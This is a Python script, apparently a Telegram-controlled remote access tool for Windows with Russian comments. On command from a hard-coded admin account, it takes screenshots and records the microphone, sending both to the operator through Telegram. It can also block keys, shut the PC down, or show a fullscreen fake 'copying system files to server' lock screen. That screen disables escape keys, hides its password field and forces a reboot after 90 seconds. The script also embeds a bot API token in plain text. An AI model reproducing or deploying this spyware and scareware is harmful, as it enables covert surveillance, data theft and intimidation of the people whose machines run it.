import os
import asyncio
import mss
import tkinter as tk
from tkinter import messagebox
import keyboard
import webbrowser
import pyautogui
import sounddevice as sd
from scipy.io import wavfile
import ctypes

from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.client.session.aiohttp import AiohttpSession

# --- НАСТРОЙКИ ---
API_TOKEN = '8463167776:AAFyRsId2qlOa7qv4yKXi0gvdfKC1bCc2jM'
ADMIN_ID = 790289059 
LOCK_PASSWORD = "1234"

session = AiohttpSession()
bot = Bot(token=API_TOKEN, session=session)
dp = Dispatcher()

# Состояние блокировки
keys_blocked = False
blocked_list = ['windows', 'alt', 'tab', 'esc', '1', '2', '3', 'w', 'a']

# --- ФУНКЦИИ УПРАВЛЕНИЯ ---

def close_active_window():
    pyautogui.hotkey('alt', 'f4')

def toggle_keys():
    global keys_blocked
    if not keys_blocked:
        for key in blocked_list:
            try: keyboard.block_key(key)
            except: pass
        keys_blocked = True
        return "🚫 Клавиши ЗАБЛОКИРОВАНЫ"
    else:
        keyboard.unhook_all()
        keys_blocked = False
        return "✅ Клавиши РАЗБЛОКИРОВАНЫ"

# --- ОКНО ИМИТАЦИИ КОПИРОВАНИЯ И БЛОКИРОВКИ ---

def show_secure_lock():
    pyautogui.press('volumemute')
    root = tk.Tk()
    root.attributes("-topmost", True, "-fullscreen", True)
    root.configure(bg='black')
    root.config(cursor="none")
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    
    # Жесткая блокировка клавиш на время работы окна
    for k in ['windows', 'alt', 'tab', 'esc', 'ctrl', 'delete']:
        try: keyboard.block_key(k)
        except: pass

    # Текстовые элементы
    tk.Label(root, text="SYSTEM STATUS: CRITICAL", 
             fg="red", bg="black", font=("Courier New", 14)).pack(pady=20)

    label_main = tk.Label(root, text="КОПИРОВАНИЕ ФАЙЛОВ СИСТЕМЫ НА СЕРВЕР...", 
                          fg="#00FF00", bg="black", font=("Courier New", 28, "bold"))
    label_main.pack(expand=True)

    label_timer = tk.Label(root, text="Инициализация перезагрузки через: 90 сек", 
                           fg="gray", bg="black", font=("Courier New", 18))
    label_timer.pack(pady=40)

    # Скрытое поле ввода пароля (черное на черном)
    pwd_entry = tk.Entry(root, show="*", font=("Arial", 1), bg="black", fg="black", borderwidth=0, insertontime=0)
    pwd_entry.pack()
    pwd_entry.focus_force()

    remaining_time = 90

    def update_timer():
        nonlocal remaining_time
        if remaining_time > 0:
            remaining_time -= 1
            label_timer.config(text=f"Инициализация перезагрузки через: {remaining_time} сек")
            root.after(1000, update_timer)
        else:
            # Команда на перезагрузку Windows
            os.system("shutdown /r /t 0")

    def check_pwd(event=None):
        if pwd_entry.get() == LOCK_PASSWORD:
            keyboard.unhook_all()
            global keys_blocked
            keys_blocked = False
            pyautogui.press('volumemute')
            root.destroy()
        else:
            pwd_entry.delete(0, tk.END)

    pwd_entry.bind('<Return>', check_pwd)
    
    # Запуск таймера
    root.after(1000, update_timer)
    root.mainloop()

# --- КНОПКИ ТЕЛЕГРАМ ---

def get_keyboard():
    lock_text = "🔓 Заблокировать клавиши" if not keys_blocked else "🔒 Разблокировать клавиши"
    buttons = [
        [InlineKeyboardButton(text="📸 Скриншот", callback_data="screenshot")],
        [InlineKeyboardButton(text="❌ Закрыть активное окно", callback_data="close_window")],
        [InlineKeyboardButton(text=lock_text, callback_data="toggle_keys")],
        [InlineKeyboardButton(text="🎙 Запись (10с)", callback_data="record"),
         InlineKeyboardButton(text="🔇 Звук (Mute)", callback_data="mute")],
        [InlineKeyboardButton(text="🛡 ЗАПУСК КОПИРОВАНИЯ + РЕБУТ", callback_data="lock_now")],
        [InlineKeyboardButton(text="🔌 Выключить ПК", callback_data="shutdown")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

@dp.callback_query()
async def handle_callbacks(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID: return
    
    data = callback.data
    try: await callback.answer()
    except: pass

    if data == "screenshot":
        with mss.mss() as sct:
            sct.shot(output="sct.png")
            await bot.send_photo(ADMIN_ID, types.FSInputFile("sct.png"))
            os.remove("sct.png")

    elif data == "close_window":
        close_active_window()
        await bot.send_message(ADMIN_ID, "❌ Активное окно закрыто.")

    elif data == "toggle_keys":
        status = toggle_keys()
        await callback.message.edit_reply_markup(reply_markup=get_keyboard())
        await bot.send_message(ADMIN_ID, status)

    elif data == "record":
        fs = 44100
        rec = sd.rec(int(10 * fs), samplerate=fs, channels=2)
        sd.wait()
        wavfile.write("rec.wav", fs, rec)
        await bot.send_voice(ADMIN_ID, types.FSInputFile("rec.wav"))
        os.remove("rec.wav")

    elif data == "mute":
        pyautogui.press('volumemute')

    elif data == "lock_now":
        await bot.send_message(ADMIN_ID, "⚠️ Запущен процесс 'Копирование + Ребут' на 90 секунд.")
        # Запуск окна в отдельном потоке, чтобы бот не завис
        asyncio.get_event_loop().run_in_executor(None, show_secure_lock)

    elif data == "shutdown":
        os.system("shutdown /s /t 0")

async def main():
    try: 
        await bot.send_message(ADMIN_ID, "💻 Бот готов к работе. Ожидание команд...", reply_markup=get_keyboard())
    except Exception as e:
        print(f"Ошибка при запуске: {e}")
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())